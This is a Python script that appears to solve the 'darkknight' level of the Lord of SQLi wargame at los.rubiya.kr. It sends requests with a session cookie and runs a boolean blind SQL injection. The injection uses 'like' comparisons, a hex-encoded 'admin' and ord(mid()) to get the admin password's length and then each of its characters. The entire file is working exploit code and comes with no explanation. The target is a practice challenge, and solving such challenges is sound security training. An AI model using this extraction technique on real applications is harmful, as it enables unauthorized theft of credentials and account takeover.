import requests

cookie = {'PHPSESSID' : 'n8frr8gngb6pnk4mkh92dmlpjn'}

for i in range(1,21):
    url = "https://los.rubiya.kr/chall/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php?\
            no=1234 or id like 0x61646d696e %%26%%26 length(pw) like %d" % i
    res = requests.get(url, cookies=cookie)
    
    if "Hello admin" in res.text:
        pw_len = i
        print("Length of pw : %d" % i)
        break
        
pw_value = ""
for i in range(pw_len):
    for j in range(33,127):
        url = "https://los.rubiya.kr/chall/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php?\
                no=1234 or id like 0x61646d696e %%26%%26 ord(mid(pw,%d,1)) like %d" % (i+1, j)
        res = requests.get(url, cookies=cookie)

        if "Hello admin" in res.text:
            pw_value += chr(j)
            print("pw(%d) : %s" % (i+1, pw_value))
            break